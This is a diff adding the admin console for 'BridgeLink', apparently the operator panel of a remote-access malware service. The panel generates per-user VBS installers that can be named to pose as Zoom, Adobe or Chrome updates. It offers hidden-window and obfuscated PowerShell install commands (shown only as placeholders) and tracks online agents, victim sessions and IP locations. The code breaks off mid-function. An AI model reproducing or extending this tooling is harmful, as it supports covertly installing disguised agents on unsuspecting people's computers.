@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BridgeLink Admin</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0f; color: #fff; font-family: monospace; min-height: 100vh; }
+        .login-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: #111118; border: 1px solid #222; border-radius: 12px; padding: 40px; width: 340px; display: flex; flex-direction: column; gap: 16px; }
+        .logo { color: #7c6aff; font-size: 22px; letter-spacing: 2px; font-weight: bold; }
+        .sub { color: #555; font-size: 13px; }
+        .error-text { color: #ff4444; font-size: 13px; display: none; }
+        input { background: #0d0d14; border: 1px solid #333; border-radius: 8px; padding: 12px 16px; color: #fff; font-size: 14px; outline: none; font-family: monospace; width: 100%; }
+        input:focus { border-color: #7c6aff; }
+        .btn { background: #7c6aff; border: none; border-radius: 8px; padding: 12px 16px; color: #fff; font-size: 14px; cursor: pointer; font-weight: 600; font-family: monospace; width: 100%; }
+        .btn:hover { opacity: 0.85; }
+        .btn-sm { background: #7c6aff; border: none; border-radius: 6px; padding: 6px 14px; color: #fff; font-size: 12px; cursor: pointer; font-family: monospace; }
+        .btn-sm:hover { opacity: 0.85; }
+        .btn-danger { background: transparent; border: 1px solid #ff4444; color: #ff4444; border-radius: 6px; padding: 8px 16px; cursor: pointer; font-family: monospace; font-size: 12px; }
+        .btn-danger:hover { background: #2a0d0d; }
+        .btn-danger-sm { background: transparent; border: 1px solid #ff4444; color: #ff4444; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; }
+        .btn-danger-sm:hover { background: #2a0d0d; }
+        .btn-secondary { background: #1a1a2a; border: 1px solid #333; color: #aaa; border-radius: 6px; padding: 8px 16px; cursor: pointer; font-family: monospace; font-size: 12px; }
+        .btn-secondary:hover { border-color: #7c6aff; color: #7c6aff; }
+        .btn-copy { background: #1a1a2a; border: 1px solid #333; color: #aaa; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; white-space: nowrap; }
+        .btn-copy:hover { border-color: #4cff91; color: #4cff91; }
+        .btn-copy-ps { background: #1a0a2a; border: 1px solid #9b59b6; color: #9b59b6; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; white-space: nowrap; }
+        .btn-copy-ps:hover { background: #2a0a3a; border-color: #c39bd3; color: #c39bd3; }
+        .btn-copy-obf { background: #0a1f0a; border: 1px solid #4cff91; color: #4cff91; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; white-space: nowrap; }
+        .btn-copy-obf:hover { background: #0d2a0d; }
+        .btn-green { background: transparent; border: 1px solid #4cff91; color: #4cff91; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; white-space: nowrap; }
+        .btn-green:hover { background: #0d1a0d; }
+        .btn-yellow { background: transparent; border: 1px solid #ffaa00; color: #ffaa00; border-radius: 6px; padding: 5px 10px; cursor: pointer; font-family: monospace; font-size: 11px; white-space: nowrap; }
+        .btn-yellow:hover { background: #2a1a00; }
+        .btn-warn { background: transparent; border: 1px solid #ffaa00; color: #ffaa00; border-radius: 6px; padding: 6px 12px; cursor: pointer; font-family: monospace; font-size: 11px; }
+        .btn-warn:hover { background: #2a1a00; }
+        .btn-edit { background: transparent; border: 1px solid #333; color: #666; border-radius: 6px; padding: 3px 8px; cursor: pointer; font-family: monospace; font-size: 11px; }
+        .btn-edit:hover { border-color: #7c6aff; color: #7c6aff; }
+        .btn-backup { background: #0a1f0a; border: 1px solid #4cff91; color: #4cff91; border-radius: 6px; padding: 8px 16px; cursor: pointer; font-family: monospace; font-size: 12px; }
+        .btn-backup:hover { background: #0d2a0d; }
+        .admin-wrap { padding: 24px; max-width: 1400px; margin: 0 auto; display: none; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid #222; flex-wrap: wrap; gap: 12px; }
+        .header-actions { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+        .tabs { display: flex; gap: 4px; margin-bottom: 24px; border-bottom: 1px solid #222; flex-wrap: wrap; }
+        .tab { background: transparent; border: none; border-bottom: 2px solid transparent; color: #555; font-family: monospace; font-size: 13px; padding: 10px 20px; cursor: pointer; transition: all 0.15s; }
+        .tab:hover { color: #aaa; }
+        .tab.active { color: #7c6aff; border-bottom-color: #7c6aff; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
+        .card-title { color: #7c6aff; font-size: 13px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 24px; }
+        .stat-card { background: #111118; border: 1px solid #222; border-radius: 10px; padding: 16px; text-align: center; }
+        .stat-num { font-size: 26px; font-weight: bold; color: #7c6aff; }
+        .stat-label { font-size: 11px; color: #555; margin-top: 4px; }
+        .msg-bar { border-radius: 8px; padding: 12px 16px; font-size: 13px; margin-bottom: 16px; display: none; }
+        .msg-bar.show { display: block; }
+        .msg-bar.success-bar { background: #0d1a0d; border: 1px solid #4cff91; color: #4cff91; }
+        .msg-bar.error-bar { background: #1a0d0d; border: 1px solid #ff4444; color: #ff4444; }
+        .section { background: #111118; border: 1px solid #222; border-radius: 12px; padding: 24px; margin-bottom: 24px; }
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 8px; }
+        .table { display: flex; flex-direction: column; gap: 6px; max-height: 400px; overflow-y: auto; }
+        .table::-webkit-scrollbar { width: 4px; }
+        .table::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+        .log-row { background: #0d0d14; border-radius: 6px; padding: 10px 14px; display: grid; grid-template-columns: 150px 130px 120px 1fr; gap: 12px; align-items: center; border-left: 3px solid #333; font-size: 12px; }
+        .log-row.success { border-left-color: #4cff91; }
+        .log-row.failed { border-left-color: #ff4444; }
+        .session-row { background: #0d0d14; border-radius: 6px; padding: 12px 16px; display: grid; grid-template-columns: 130px 140px 1fr 80px 120px; gap: 12px; align-items: center; border-left: 3px solid #7c6aff; font-size: 12px; }
+        .history-row { background: #0d0d14; border-radius: 6px; padding: 10px 14px; display: grid; grid-template-columns: 130px 130px 130px 80px 1fr; gap: 12px; align-items: center; border-left: 3px solid #444; font-size: 12px; }
+        .blocked-row { background: #0d0d14; border-radius: 6px; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; border-left: 3px solid #ff4444; font-size: 12px; }
+        .user-card { background: #0d0d14; border: 1px solid #1e1e2e; border-radius: 10px; padding: 18px 20px; border-left: 3px solid #7c6aff; display: flex; flex-direction: column; gap: 14px; margin-bottom: 12px; }
+        .user-card:hover { background: #111118; }
+        .user-top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+        .user-name { color: #e8e8f0; font-size: 15px; font-weight: bold; }
+        .user-id-badge { color: #7c6aff; font-size: 12px; background: #0d0a1f; padding: 2px 8px; border-radius: 6px; border: 1px solid #7c6aff33; }
+        .link-row { display: flex; align-items: center; gap: 8px; background: #07070e; border: 1px solid #1a1a2a; border-radius: 6px; padding: 8px 12px; margin-bottom: 6px; flex-wrap: wrap; }
+        .link-text { flex: 1; color: #555; font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
+        .user-actions { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
+        .badge-online { background: #0d1a0d; color: #4cff91; border: 1px solid #4cff9133; border-radius: 10px; padding: 2px 8px; font-size: 10px; }
+        .badge-offline { background: #111; color: #444; border: 1px solid #2a2a2a; border-radius: 10px; padding: 2px 8px; font-size: 10px; }
+        .badge-live { background: #0d1a0d; color: #4cff91; border: 1px solid #4cff91; border-radius: 10px; padding: 2px 8px; font-size: 10px; font-weight: bold; animation: pulse 2s infinite; }
+        .agent-dl-section { background: #0a0a14; border: 1px solid #1a1a2a; border-radius: 10px; padding: 16px 20px; margin-bottom: 20px; }
+        .agent-dl-row { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid #111; flex-wrap: wrap; }
+        .agent-dl-row:last-child { border-bottom: none; }
+        .agent-dl-label { color: #aaa; font-size: 12px; min-width: 140px; }
+        .agent-dl-link { flex: 1; color: #555; font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .fname-edit-row { display: none; align-items: center; gap: 8px; margin-top: 6px; }
+        .fname-edit-row.show { display: flex; }
+        .fname-input { background: #111128; border: 1px solid #7c6aff; border-radius: 6px; padding: 6px 10px; color: #fff; font-size: 12px; font-family: monospace; outline: none; width: 200px; }
+        .row-label { color: #444; font-size: 10px; margin-bottom: 4px; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+        .ip-text { color: #7c6aff; }
+        .loc-text { color: #ffaa00; font-size: 10px; margin-top: 2px; }
+        .time-text { color: #555; }
+        .empty { color: #333; text-align: center; padding: 30px; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.75); z-index: 1000; align-items: center; justify-content: center; }
+        .modal-overlay.show { display: flex; }
+        .modal { background: #111118; border: 1px solid #333; border-radius: 12px; padding: 28px; width: 420px; display: flex; flex-direction: column; gap: 16px; max-height: 90vh; overflow-y: auto; }
+        .modal-title { color: #7c6aff; font-size: 16px; font-weight: bold; }
+        .lic-row { background: #0d0d14; border: 1px solid #1e1e2e; border-radius: 8px; padding: 14px 16px; display: grid; grid-template-columns: 180px 80px 130px 1fr auto; gap: 12px; align-items: center; font-size: 12px; margin-bottom: 6px; }
+        .lic-row.unused { border-left: 3px solid #444; }
+        .lic-row.active { border-left: 3px solid #4cff91; }
+        .lic-row.revoked { border-left: 3px solid #ff4444; opacity: 0.6; }
+        .lic-row.expired { border-left: 3px solid #ffaa00; opacity: 0.6; }
+        .lic-key { color: #7c6aff; font-size: 13px; letter-spacing: 1px; font-weight: bold; }
+        .lic-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px; }
+        .refresh-spin { display: inline-block; transition: transform 0.5s; }
+        .refresh-spin.spinning { animation: spin 0.6s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 900px) {
+            .grid-2 { grid-template-columns: 1fr; }
+            .stats { grid-template-columns: 1fr 1fr; }
+            .log-row,.session-row,.history-row { grid-template-columns: 1fr; }
+            .lic-row { grid-template-columns: 1fr; }
+            .lic-stats { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrap" id="loginWrap">
+        <div class="login-box">
+            <div class="logo">⬡ BridgeLink</div>
+            <div class="sub">Admin Panel</div>
+            <div class="error-text" id="loginError"></div>
+            <input type="password" id="adminPass" placeholder="Admin password" onkeydown="if(event.key==='Enter')adminLogin()">
+            <button class="btn" id="loginBtn" onclick="adminLogin()">Enter Admin</button>
+            <button class="btn-secondary" style="margin-top:4px" onclick="window.location.href='/'">← Back to BridgeLink</button>
+        </div>
+    </div>
+
+    <div class="admin-wrap" id="adminWrap">
+        <div class="admin-header">
+            <div class="logo">⬡ BridgeLink Admin</div>
+            <div class="header-actions">
+                <button class="btn-secondary" id="refreshBtn" onclick="doRefresh()"><span class="refresh-spin" id="refreshIcon">↻</span> Refresh</button>
+                <button class="btn-backup" onclick="downloadBackup()">💾 Backup</button>
+                <button class="btn-danger" onclick="clearLogs()">🗑 Clear Logs</button>
+                <button class="btn-warn" onclick="restartRelay()">⟳ Restart Relay</button>
+                <button class="btn-secondary" onclick="logout()">← Exit</button>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('users',this)">👥 Users</button>
+            <button class="tab" onclick="switchTab('licenses',this)">🔑 Licenses</button>
+            <button class="tab" onclick="switchTab('sessions',this)">🔴 Sessions</button>
+            <button class="tab" onclick="switchTab('security',this)">🛡 Security</button>
+            <button class="tab" onclick="switchTab('logs',this)">📜 Logs</button>
+            <button class="tab" onclick="switchTab('settings',this)">⚙️ Settings</button>
+        </div>
+
+        <div class="msg-bar" id="msgBar"></div>
+
+        <!-- USERS TAB -->
+        <div class="tab-content active" id="tab-users">
+            <div class="agent-dl-section">
+                <div style="color:#7c6aff;font-size:13px;font-weight:bold;letter-spacing:1px;margin-bottom:12px">🖥 AGENT BINARIES — universal, same for all users</div>
+                <div class="agent-dl-row">
+                    <span class="agent-dl-label">🪟 Windows (.exe)</span>
+                    <span class="agent-dl-link">https://bridgelink.click/download/TaskAssist.exe</span>
+                    <button class="btn-copy" onclick="copyText('https://bridgelink.click/download/TaskAssist.exe',this)">📋 Copy</button>
+                    <a href="https://bridgelink.click/download/TaskAssist.exe" download style="text-decoration:none"><button class="btn-green">⬇ Download</button></a>
+                </div>
+                <div class="agent-dl-row">
+                    <span class="agent-dl-label">🪟 Windows Installer</span>
+                    <span class="agent-dl-link">https://bridgelink.click/download/BridgeLinkSetup.exe</span>
+                    <button class="btn-copy" onclick="copyText('https://bridgelink.click/download/BridgeLinkSetup.exe',this)">📋 Copy</button>
+                    <a href="https://bridgelink.click/download/BridgeLinkSetup.exe" download style="text-decoration:none"><button class="btn-green">⬇ Download</button></a>
+                </div>
+                <div class="agent-dl-row">
+                    <span class="agent-dl-label">🖥 Desktop App</span>
+                    <span class="agent-dl-link">https://bridgelink.click/download/BridgeLinkDesktopSetup.exe</span>
+                    <button class="btn-copy" onclick="copyText('https://bridgelink.click/download/BridgeLinkDesktopSetup.exe',this)">📋 Copy</button>
+                    <a href="https://bridgelink.click/download/BridgeLinkDesktopSetup.exe" download style="text-decoration:none"><button class="btn-green">⬇ Download</button></a>
+                </div>
+                <div class="agent-dl-row">
+                    <span class="agent-dl-label">🐧 Linux (binary)</span>
+                    <span class="agent-dl-link">https://bridgelink.click/download/agent</span>
+                    <button class="btn-copy" onclick="copyText('https://bridgelink.click/download/agent',this)">📋 Copy</button>
+                    <a href="https://bridgelink.click/download/agent" download style="text-decoration:none"><button class="btn-green">⬇ Download</button></a>
+                </div>
+            </div>
+            <div class="section">
+                <div class="section-header">
+                    <div class="card-title">👥 Users & Installers</div>
+                    <button class="btn-sm" onclick="showCreateUser()">+ New User</button>
+                </div>
+                <div style="color:#444;font-size:12px;margin-bottom:16px">Each user gets their own passphrase, isolated agents, VBS installer, TXT version and PowerShell commands.</div>
+                <div id="usersTable"><div class="empty">Loading...</div></div>
+            </div>
+        </div>
+
+        <!-- LICENSES TAB -->
+        <div class="tab-content" id="tab-licenses">
+            <div class="lic-stats">
+                <div class="stat-card"><div class="stat-num" id="licTotal">0</div><div class="stat-label">Total Keys</div></div>
+                <div class="stat-card"><div class="stat-num" id="licUnused" style="color:#555">0</div><div class="stat-label">Unused</div></div>
+                <div class="stat-card"><div class="stat-num" id="licActive" style="color:#4cff91">0</div><div class="stat-label">Active</div></div>
+                <div class="stat-card"><div class="stat-num" id="licRevoked" style="color:#ff4444">0</div><div class="stat-label">Revoked</div></div>
+            </div>
+            <div class="section">
+                <div class="section-header">
+                    <div class="card-title">🔑 License Keys</div>
+                    <button class="btn-sm" onclick="showGenerateLicenses()">+ Generate Keys</button>
+                </div>
+                <div id="licensesTable"><div class="empty">No license keys yet — click Generate Keys</div></div>
+            </div>
+        </div>
+
+        <!-- SESSIONS TAB -->
+        <div class="tab-content" id="tab-sessions">
+            <div class="stats">
+                <div class="stat-card"><div class="stat-num" id="statTotal">0</div><div class="stat-label">Total Visits</div></div>
+                <div class="stat-card"><div class="stat-num" id="statSuccess" style="color:#4cff91">0</div><div class="stat-label">Logins</div></div>
+                <div class="stat-card"><div class="stat-num" id="statFailed" style="color:#ff4444">0</div><div class="stat-label">Failed</div></div>
+                <div class="stat-card"><div class="stat-num" id="statUnique" style="color:#ffaa00">0</div><div class="stat-label">Unique IPs</div></div>
+                <div class="stat-card"><div class="stat-num" id="statLive" style="color:#4cff91">0</div><div class="stat-label">Live Now</div></div>
+            </div>
+            <div class="section">
+                <div class="section-header">
+                    <div class="card-title">🔴 Active Sessions <span class="badge-live">LIVE</span></div>
+                    <span id="liveCount" style="color:#555;font-size:12px">0 active</span>
+                </div>
+                <div class="table" id="sessionsTable"><div class="empty">No active sessions</div></div>
+            </div>
+            <div class="section">
+                <div class="section-header">
+                    <div class="card-title">📋 Session History</div>
+                    <span id="historyCount" style="color:#555;font-size:12px">0 sessions</span>
+                </div>
+                <div class="table" id="historyTable"><div class="empty">No history yet</div></div>
+            </div>
+        </div>
+
+        <!-- SECURITY TAB -->
+        <div class="tab-content" id="tab-security">
+            <div class="section">
+                <div class="card-title" style="margin-bottom:16px">🚫 Blocked IPs</div>
+                <div style="display:flex;gap:8px;margin-bottom:12px">
+                    <input type="text" id="blockIpInput" placeholder="IP to block e.g. 1.2.3.4" style="flex:1">
+                    <button class="btn-danger" onclick="blockIp()" style="white-space:nowrap;width:auto;padding:8px 16px">Block IP</button>
+                </div>
+                <div class="table" id="blockedTable"><div class="empty">No blocked IPs</div></div>
+            </div>
+        </div>
+
+        <!-- LOGS TAB -->
+        <div class="tab-content" id="tab-logs">
+            <div class="section">
+                <div class="section-header">
+                    <div class="card-title">📜 Visitor Logs</div>
+                    <span id="logsCount" style="color:#555;font-size:12px">0 entries</span>
+                </div>
+                <div class="table" id="logsTable"><div class="empty">No logs yet</div></div>
+            </div>
+        </div>
+
+        <!-- SETTINGS TAB -->
+        <div class="tab-content" id="tab-settings">
+            <div class="grid-2">
+                <div class="section" style="margin-bottom:0">
+                    <div class="card-title" style="margin-bottom:16px">🔑 Admin Password</div>
+                    <div style="display:flex;flex-direction:column;gap:10px">
+                        <input type="password" id="oldAdminPass" placeholder="Current password">
+                        <input type="password" id="newAdminPass" placeholder="New password">
+                        <button class="btn" onclick="changeAdminPassword()">Update Password</button>
+                    </div>
+                </div>
+                <div class="section" style="margin-bottom:0">
+                    <div class="card-title" style="margin-bottom:16px">ℹ️ System</div>
+                    <div style="display:flex;flex-direction:column;gap:8px;color:#555;font-size:13px">
+                        <div>Relay: <span style="color:#4cff91">relay.bridgelink.click</span></div>
+                        <div>Dashboard: <span style="color:#4cff91">bridgelink.click</span></div>
+                        <div id="sysUserCount">Users: —</div>
+                        <div id="sysLicCount">Licenses: —</div>
+                    </div>
+                    <div style="margin-top:16px">
+                        <button class="btn-backup" onclick="downloadBackup()" style="width:100%">💾 Download Full Backup</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODALS -->
+    <div class="modal-overlay" id="createUserModal">
+        <div class="modal">
+            <div class="modal-title">+ Create New User</div>
+            <div style="color:#555;font-size:12px">Each user gets isolated agents, install link, TXT and PowerShell commands.</div>
+            <div style="display:flex;flex-direction:column;gap:10px">
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">NAME</div><input type="text" id="newUserName" placeholder="e.g. Boss, John, Client A"></div>
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">PASSPHRASE</div><input type="text" id="newUserPass" placeholder="min 6 characters"></div>
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">FILE NAME (optional)</div><input type="text" id="newUserFileName" placeholder="e.g. Zoom, AdobeUpdate, ChromeSetup"></div>
+            </div>
+            <div style="display:flex;gap:8px">
+                <button class="btn" onclick="createUser()" style="flex:1">Create User</button>
+                <button class="btn-secondary" onclick="hideCreateUser()" style="width:auto">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="changePassModal">
+        <div class="modal">
+            <div class="modal-title">🔑 Change Passphrase</div>
+            <div style="color:#555;font-size:12px" id="changePassUserName"></div>
+            <input type="hidden" id="changePassUserId">
+            <div><div style="color:#555;font-size:11px;margin-bottom:4px">NEW PASSPHRASE</div><input type="text" id="changePassValue" placeholder="min 6 characters"></div>
+            <div style="display:flex;gap:8px">
+                <button class="btn" onclick="doChangePassphrase()" style="flex:1">Update</button>
+                <button class="btn-secondary" onclick="hideChangePass()" style="width:auto">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="generateLicModal">
+        <div class="modal">
+            <div class="modal-title">🔑 Generate License Keys</div>
+            <div style="color:#555;font-size:12px">Each key can only be used once and is tied to one device.</div>
+            <div style="display:flex;flex-direction:column;gap:10px">
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">NUMBER OF KEYS (max 50)</div><input type="number" id="licCount" value="1" min="1" max="50"></div>
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">NOTE (optional)</div><input type="text" id="licNote" placeholder="e.g. John Doe, Hackathon batch"></div>
+                <div><div style="color:#555;font-size:11px;margin-bottom:4px">EXPIRY DAYS (0 = never)</div><input type="number" id="licExpiry" value="0" min="0"></div>
+            </div>
+            <div style="display:flex;gap:8px">
+                <button class="btn" onclick="generateLicenses()" style="flex:1">Generate</button>
+                <button class="btn-secondary" onclick="hideGenerateLicenses()" style="width:auto">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const API = 'https://relay.bridgelink.click';
+    let adminToken = '';
+    let refreshInterval = null;
+    let isRefreshing = false;
+    const psStore = {}, psObfStore = {};
+
+    async function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        const btn = document.getElementById('loginBtn');
+        const err = document.getElementById('loginError');
+        btn.disabled = true; btn.textContent = '⟳ Verifying...'; err.style.display = 'none';
+        try {
+            const res = await fetch(API + '/admin/logs', { headers: { 'x-admin-token': pass } });
+            if (res.ok) {
+                adminToken = pass;
+                document.getElementById('loginWrap').style.display = 'none';
+                document.getElementById('adminWrap').style.display = 'block';
+                await refreshAll();
+                refreshInterval = setInterval(async () => {
+                    await fetchSessions();
+                    const editing = document.querySelector('.fname-edit-row.show');
+                    if (!editing) await fetchUsers();
+                    await fetchLicenses();
+                }, 5000);
+            } else { err.textContent = 'Wrong admin password'; err.style.display = 'block'; }
+        } catch { err.textContent = 'Connection failed'; err.style.display = 'block'; }
+        btn.disabled = false; btn.textContent = 'Enter Admin';
+    }
+
+    function switchTab(name, el) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.getElementById('tab-' + name).classList.add('active');
+        el.classList.add('active');
+        if (name === 'licenses') fetchLicenses();
+        if (name === 'sessions') fetchSessions();
+        if (name === 'logs') fetchLogs();
+        if (name === 'security') fetchBlockedIPs();
+    }
+
+    async function doRefresh() {
+        if (isRefreshing) return;
+        isRefreshing = true;
+        const icon = document.getElementById('refreshIcon');
+        const btn = document.getElementById('refreshBtn');
+        icon.classList.add('spinning');
+        btn.disabled = true;
+        try { await refreshAll(); } catch {}
+        icon.classList.remove('spinning');
+        btn.disabled = false;
+        isRefreshing = false;
+        showMsg('✅ Refreshed', true);
+    }
+
+    async function refreshAll() {
+        await Promise.all([fetchUsers(), fetchLogs(), fetchSessions(), fetchBlockedIPs(), fetchLicenses()]);
+    }
+
+    async function downloadBackup() {
+        showMsg('⟳ Preparing backup...', true);
+        try {
+            const res = await fetch(API + '/admin/backup', { headers: { 'x-admin-token': adminToken } });
+            if (!res.ok) { showMsg('❌ Backup failed', false); return; }
+            const blob = await res.blob();
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = 'bridgelink-backup.zip'; a.click();
+            URL.revokeObjectURL(url);
+            showMsg('✅ Backup downloaded', true);
+        } catch { showMsg('❌ Backup failed', false); }
+    }
+
+    async function fetchUsers() {
+        try {
+            const res = await fetch(API + '/admin/users', { headers: { 'x-admin-token': adminToken } });
+            const data = await res.json();
+            renderUsers(data.users || []);
+            document.getElementById('sysUserCount').textContent = 'Users: ' + (data.users || []).length;
+        } catch {}
+    }
+
+    function renderUsers(users) {
+        const table = document.getElementById('usersTable');
+        if (!users.length) { table.innerHTML = '<div class="empty">No users yet — click + New User</div>'; return; }
+        users.forEach(u => { psStore[u.id] = u.psOneLiner; psObfStore[u.id] = u.psObfuscated; });
+        table.innerHTML = users.map(u => {
+            const installLink = API + '/install/' + u.downloadToken;
+            const installerLink = API + '/install/setup/' + u.downloadToken;
+            const created = new Date(u.createdAt).toLocaleDateString();
+            const agentBadge = u.onlineAgents > 0 ? '<span class="badge-online">● ' + u.onlineAgents + ' agent' + (u.onlineAgents > 1 ? 's' : '') + ' online</span>' : '<span class="badge-offline">No agents</span>';
+            return '<div class="user-card">' +
+                '<div class="user-top"><div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap"><span class="user-name">' + u.name + '</span><span class="user-id-badge">' + u.displayId + '</span>' + agentBadge + '</div><span style="color:#444;font-size:11px">Created ' + created + '</span></div>' +
+                '<div style="display:flex;gap:24px;flex-wrap:wrap"><div><div class="row-label">PASSPHRASE</div><div style="color:#7c6aff;font-size:13px">' + u.passphrase + '</div></div>' +
+                '<div><div style="display:flex;align-items:center;gap:6px;margin-bottom:3px"><span class="row-label" style="margin-bottom:0">FILE NAME</span><button class="btn-edit" onclick="showFnameEdit(\'' + u.id + '\')">✏️ Edit</button></div>' +
+                '<div style="color:#ffaa00;font-size:13px" id="fname-disp-' + u.id + '">' + u.fileName + '.vbs</div>' +
+                '<div class="fname-edit-row" id="fname-row-' + u.id + '"><input class="fname-input" id="fname-val-' + u.id + '" type="text" value="' + u.fileName + '"><button class="btn-sm" onclick="saveFileName(\'' + u.id + '\')">Save</button><button class="btn-edit" onclick="hideFnameEdit(\'' + u.id + '\')">✕</button></div></div></div>' +
+                '<div><div class="row-label">📎 INSTALL LINK</div><div class="link-row"><span class="link-text">' + installLink + '</span><button class="btn-copy" onclick="copyText(\'' + installLink + '\',this)">📋 Copy</button><button class="btn-green" onclick="downloadInstaller(\'' + u.id + '\',\'' + u.fileName + '\',\'vbs\')">⬇ VBS</button><button class="btn-yellow" onclick="downloadInstaller(\'' + u.id + '\',\'' + u.fileName + '\',\'txt\')">⬇ TXT</button></div></div>' +
+                '<div><div class="row-label">🪟 WINDOWS INSTALLER</div><div class="link-row"><span class="link-text">' + installerLink + '</span><button class="btn-copy" onclick="copyText(\'' + installerLink + '\',this)">📋 Copy</button><a href="' + installerLink + '" download style="text-decoration:none"><button class="btn-green">⬇ Installer</button></a></div></div>' +
+                '<div><div class="row-label">💻 POWERSHELL</div><div class="link-row"><span class="link-text" style="color:#9b59b6">Plain — powershell -w h -c "..."</span><button class="btn-copy-ps" onclick="copyPS(\'' + u.id + '\',\'plain\',this)">📋 Copy Plain</button></div><div class="link-row"><span class="link-text" style="color:#4cff91">Obfuscated — powershell -w h -enc ...</span><button class="btn-copy-obf" onclick="copyPS(\'' + u.id + '\',\'obf\',this)">📋 Copy Obf</button></div></div>' +
+                '<div class="user-actions"><button class="btn-warn" onclick="showChangePass(\'' + u.id + '\',\'' + u.name + '\')">🔑 Passphrase</button><button class="btn-danger-sm" onclick="deleteUser(\'' + u.id + '\',\'' + u.name + '\')">🗑 Delete</button></div></div>';
+        }).join('');
+    }
+
+    // LICENSE FUNCTIONS
+    async function fetchLicenses() {
+        try {
+            const res = await fetch(API + '/admin/licenses', { headers: { 'x-admin-token': adminToken } });
+            const data = await res.json();
+            renderLicenses(data.licenses || []);
+        } catch {}
+    }
+
+    function renderLicenses(licenses) {
+        const total = licenses.length;
+        const unused = licenses.filter(l => l.status === 'unused').length;
+        const active = licenses.filter(l => l.status === 'active').length;
+        const revoked = licenses.filter(l => l.status === 'revoked').length;
+        document.getElementById('licTotal').textContent = total;
+        document.getElementById('licUnused').textContent = unused;
+        document.getElementById('licActive').textContent = active;
+        document.getElementById('licRevoked').textContent = revoked;
+        document.getElementById('sysLicCount').textContent = 'Licenses: ' + total + ' (' + active + ' active)';
+        const table = document.getElementById('licensesTable');
+        if (!licenses.length) { table.innerHTML = '<div class="empty">No license keys yet — click Generate Keys</div>'; return; }
+        table.innerHTML = licenses.map(l => {
+            const statusColor = l.status === 'active' ? '#4cff91' : l.status === 'revoked' ? '#ff4444' : l.status === 'expired' ? '#ffaa00' : '#555';
+            const statusText = l.status === 'active' ? '● Active' : l.status === 'revoked' ? '✕ Revoked' : l.status === 'expired' ? '⚠ Expired' : '○ Unused';
+            const usedInfo = l.usedAt ? '<div style="color:#555;font-size:10px">Used: ' + new Date(l.usedAt).toLocaleDateString() + '</div>' + (l.hardwareId ? '<div style="color:#333;font-size:10px">HW: ' + l.hardwareId.substring(0, 12) + '...</div>' : '') : '<div style="color:#333;font-size:10px">Not yet used</div>';
+            const noteText = l.note ? '<span style="color:#555;font-size:11px">' + l.note + '</span>' : '<span style="color:#333;font-size:11px">No note</span>';
+            const expText = l.expiresAt ? '<div style="color:#ffaa00;font-size:10px">Expires: ' + new Date(l.expiresAt).toLocaleDateString() + '</div>' : '';
+            const canRevoke = l.status === 'active' || l.status === 'unused';
+            const actions = '<div style="display:flex;gap:6px;flex-wrap:wrap">' +
+                '<button class="btn-copy" onclick="copyText(\'' + l.key + '\',this)">📋 Copy</button>' +
+                (canRevoke ? '<button class="btn-danger-sm" onclick="revokeLicense(\'' + l.id + '\')">Revoke</button>' : '') +
+                '<button class="btn-edit" onclick="deleteLicense(\'' + l.id + '\')">🗑</button>' +
+                '</div>';
+            return '<div class="lic-row ' + l.status + '">' +
+                '<div><div class="lic-key">' + l.key + '</div><div style="color:#333;font-size:10px">' + new Date(l.createdAt).toLocaleDateString() + '</div>' + expText + '</div>' +
+                '<div style="color:' + statusColor + ';font-size:12px">' + statusText + '</div>' +
